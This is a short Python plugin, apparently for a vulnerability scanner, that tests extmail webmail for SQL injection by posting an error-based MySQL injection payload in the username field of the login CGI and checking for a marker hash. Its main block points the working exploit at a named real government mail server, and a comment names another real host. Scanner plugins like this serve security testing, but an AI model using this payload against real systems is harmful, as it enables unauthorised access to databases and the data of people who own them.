#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.wooyun.org/bugs/wooyun-2015-095220
#      http://zhanzhang.anquan.org/vul-detail/51e390676856be7e3b419037/
#      怕Refer不精确附加一个arg http://mail.cmaritime.com.cn/

def assign(service, arg): 
    if service == "extmail":
        return True, arg
		
def audit(arg): 
    payload = 'extmail/cgi/index.cgi'
    postdata = 'username=aa\' OR ROW(3293,3743)>(SELECT COUNT(*),CONCAT((select md5(3.14)),FLOOR(RAND(0)*2))x FROM (SELECT 5422 UNION SELECT 9297 UNION SELECT 5245)a GROUP BY x)#'
    code, head, res, errcode, _ = curl.curl2(arg+payload,postdata)
    if code == 200 and '4beed3b9c4a886067de0e3a094246f781' in res:
        security_hole('SQLinjection '+arg+payload)        
				
if __name__ == '__main__': 
    from dummy import *
    audit(assign('extmail', 'http://mail.ca.suzhou.gov.cn/')[1])